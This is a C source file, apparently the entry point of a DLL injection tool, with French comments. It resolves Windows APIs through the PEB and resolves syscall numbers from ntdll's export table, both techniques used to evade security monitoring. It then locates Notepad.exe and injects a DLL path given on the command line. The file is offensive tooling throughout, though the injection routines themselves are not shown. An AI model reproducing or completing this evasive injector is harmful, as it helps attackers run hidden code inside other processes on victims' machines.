#include <dll-injector/main.h>
#include "utils/peb-lookup.h"
#include "utils/syscalls.h"

#ifdef DEBUG
#include <stdio.h>
#endif

/**
 * @brief Point d'entrée du programme d'injection.
 *
 * Initialise la résolution dynamique des API via le PEB et la table des
 * numéros de syscall, localise le processus cible, puis déclenche l'injection.
 *
 * @param argc Nombre d'arguments de la ligne de commande.
 * @param argv argv[1] doit contenir le chemin absolu de la DLL à injecter.
 * @return 0 en cas de succès, 1 en cas d'erreur.
 */
int main(int argc, char** argv){
  DWORD  targetPid;
  HANDLE hProcess;
  LPVOID remoteBuffer;

  /* Initialisation obligatoire des API Win32 résolues dynamiquement via le PEB.
   * Aucun appel Windows ne doit précéder cette opération. */
  if(!InitDynamicAPIs()){
#ifdef DEBUG
    printf("[-] Échec de l'initialisation des API dynamiques via le PEB.\n");
#endif
    return 1;
  }

  /* Résolution dynamique des numéros de syscall par tri de l'EAT de ntdll. */
  if(!InitSyscalls()){
#ifdef DEBUG
    printf("[-] Échec de l'initialisation de la table des syscalls.\n");
#endif
    return 1;
  }

  if(argc < 2){
#ifdef DEBUG
    printf("Usage : %s <chemin_dll>\n", argv[0]);
#endif
    return 1;
  }

  targetPid = ProcessWalking("Notepad.exe");
  if(targetPid == 0){
#ifdef DEBUG
    printf("[-] Processus cible Notepad.exe introuvable.\n");
#endif
    return 1;
  }

  remoteBuffer = NULL;
  hProcess = injectDll(targetPid, argv[1], &remoteBuffer);
  if(hProcess == NULL){
#ifdef DEBUG
    printf("[-] Échec de l'injection de la DLL.\n");
#endif
    return 1;
  }

  g_Api.pCloseHandle(hProcess);
  return 0;
}
